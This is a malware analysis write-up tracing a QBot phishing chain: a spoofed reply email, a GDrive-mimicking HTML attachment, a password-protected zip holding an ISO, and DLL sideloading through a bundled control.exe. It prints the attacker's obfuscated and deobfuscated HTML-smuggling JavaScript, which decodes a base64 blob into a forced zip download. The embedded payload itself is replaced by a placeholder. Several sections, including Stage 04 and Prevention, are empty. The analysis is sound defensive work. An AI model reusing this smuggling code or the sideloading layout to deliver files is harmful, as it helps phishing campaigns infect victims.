# Malicious (QBot)

QBot (QakBot) is a Trojan that has been active for years. It was originally malware designed to target governments and businesses for financial fraud by stealing user credentials and keystrokes, but time has moved on since then. We have recently seen an example of this targeting my employee network, so I decided to take a closer look and perform a deep analysis on this sample to see which techniques this new version uses.



## Stage 01 - Email

The email that was received by one of the employees is referencing some valid old email conversation from the target user. I've seen this technique before; it is mainly to gain credibility. However, if you check closely, the original email is from 2019, but I guess it is easy to miss. The source of the email conversion is most probably from a data leak or a compromised laptop. It is not a very good phishing attempt; it screams problems left and right, but I guess they are going for quantity, not quality. The interesting piece is the password-protected zip attachment (basic techniques to bypass malicious file filtering).

![Alt text](data/qbot_email.png?raw=true "Email sample")

## Stage 02 - HTML Attachment

Le't check the attachment.

![Alt text](data/email.png?raw=true "Document details")

It is an HTML file that mimics the GDrive page (using a screenshot that is directly encoded in the code), asking the user to download the file and open it. The file is password-protected to avoid detection on the way.

The HTML file also executes the download of the zip file automatically. The file is also packed directly into the HTML file, so no data need to be downloaded from the Internet.

```
<script language="javascript">
	var zVGUi3zP = document.getElementById('zVGUi3zP').innerText;
	function ready() {
		QqEJCIyy();
    }
	document.addEventListener("DOMContentLoaded", ready);
	zVGUi3zP = document.getElementById('zVGUi3zP').innerText;
	function th418Cpm()
	{
		const KQnNdBZQ = document.querySelector("#N5JP6xfc");
		return KQnNdBZQ.dataset.reminder;
	}
	function QqEJCIyy()
	{
		var TEnDd49w = document.createElement("embed");
		TEnDd49w.setAttribute("width", 120);
		TEnDd49w.setAttribute("height", 120);
		TEnDd49w.setAttribute("id", "cCfHr4vH");
		TEnDd49w.setAttribute("src", "data:image/svg+xml;base64," + zVGUi3zP + th418Cpm());
		document.body.appendChild(TEnDd49w);
	}
</script>
```

The HTML contains three base64 blobs - one is the screenshot used in the fake website, and the other two are later concatenated into one base64 blob. A new document element is created from that as `data:image/svg+xml;base64`. Let's check what is inside.

```
<script>
<![CDATA[
  function get_zip_date(base_64_blob, 512) {
    var YTbnoJHC = [];
    var decoded_blob = atob(base_64_blob);
    for(var i = 0; i < decoded_blob.length; i += 512) {
      var eVcLGshY = decoded_blob.slice(i, i + 512);
      var vZIZ2Kme = new Array(eVcLGshY.length);

      for(var j = 0; j < eVcLGshY.length; j++) {
        vZIZ2Kme[j] = eVcLGshY.charCodeAt(j);
      }
      var JkT5zYmW = new Uint8Array(vZIZ2Kme);
      YTbnoJHC.push(JkT5zYmW);
    }
    var zip_data = new Blob(YTbnoJHC, {type: "application/zip"});
    return zip_data;
  }
  function gdhpoIyu(zip_data) {
    let okVLUB9x = new File([zip_data], "attachment.zip", {type: "application/zip"});
    let WRQWQcyt = URL["createObjectURL"](okVLUB9x);
    window.location.assign(WRQWQcyt);
    URL.revokeObjectURL(WRQWQcyt);
  }
  var base_64_blob = "======DATA====="
  var zip_data = get_zip_date(base_64_blob, 512);
  gdhpoIyu(zip_data);
]]>
</script>
```

We are dealing with a similarly structured file. This time it is with one blob, a little bit more obfuscated script code. You can see deobfuscated function, which basically takes the blob with ZIP file data and decodes it from base64 and serves it as a zip file download.

## Stage 03 - Downloaded ZIP file and following file

The ZIP file is, as described in the email, password-protected, and after unpacking, it contains an ISO file.

```
Directory of C:\Users\labuser\Downloads\Qbot
11/28/2022  09:17 AM    <DIR>          .
11/28/2022  09:17 AM    <DIR>          ..
11/25/2022  09:54 AM         2,031,616 RNP_45105051_14112022.iso
              1 File(s)      2,031,616 bytes
```

The ISO file finally contains something interesting. Only file without `hidden` tag is `RNP_45105051_14112022.lnk`, the rest with.

```
E:\>dir /a
 Directory of E:\
11/27/2021  11:01 PM           149,504 control.exe
11/14/2022  06:37 AM             8,192 edputil.dll
11/09/2022  07:17 AM           608,248 msoffice32.dll
11/10/2022  07:17 AM             1,689 RNP_45105051_14112022.lnk
               4 File(s)        767,633 bytes
```

![Alt text](data/vt_control.png?raw=true "Email sample")

`control.exe` is a valid MS application, so the problem is coming from a different side and that is the dlls which are bundled with the exe. And how does it work? The LNK file is executing following `C:\Windows\System32\cmd.exe /c control.exe`. This will start the `control.exe` from the current folder. A new window with Control Panel will appear and also it will try to load the DLLs needed for the execution. As per default settings of Microsoft Windows, the first location to search for the dll is the current directory, the DLL `msoffice32.dll` is loaded and executed. This dll is the malicious part in the puzzle.

This technique is call DLL Sideloading. You can read more about it for example here https://businessinsights.bitdefender.com/tech-explainer-what-is-dll-sideloading.

## Stage 04

TBA

## Prevention

## Reading and References
